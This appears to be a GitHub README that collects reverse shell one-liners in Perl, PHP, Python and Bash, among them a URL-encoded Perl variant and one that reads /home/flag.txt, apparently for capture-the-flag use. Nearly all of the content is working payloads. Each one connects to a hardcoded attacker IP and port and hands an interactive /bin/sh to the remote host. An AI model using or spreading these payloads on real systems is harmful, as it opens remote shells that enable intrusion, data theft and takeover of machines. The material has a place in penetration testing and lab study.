# ReverseShellScript (Not mine script)
Reverse Shell script : PERL , PHP , PYTHON
___
## PERL
ReverseShell.pl
```&gt;&amp;S``` is an encoded format that does not work in Perl or shell. (Its output will be sent out in HTML tags.)
```perl
perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
```

ReverseShell2.pl
```>&S``` is the correct command to redirect data to socket ```S```.
```perl
perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

ReverseShell3.pl
for BIND ReverseShell ;)
```perl
perl -e 'use Socket;$i="10.8.0.99";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    select(S); $|=1;
    print S "=== Connected ===\n";
    open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
    system("cat /home/flag.txt");
};'
```

ReverseShell URL Encode Perl
```perl
echo%20%27use%20Socket%3B%24i%3D%22192.168.0.1%22%3B%24p%3D8000%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
```

## PHP
ReverseShell.php    ( The code is very longgggg !!! )

https://github.com/Sho2007/ReverseShellScript/blob/main/ReverseShell.php

ReverseShell2.php
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PYTHON
```python
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.8.0.99",8000));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

## BASH
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```


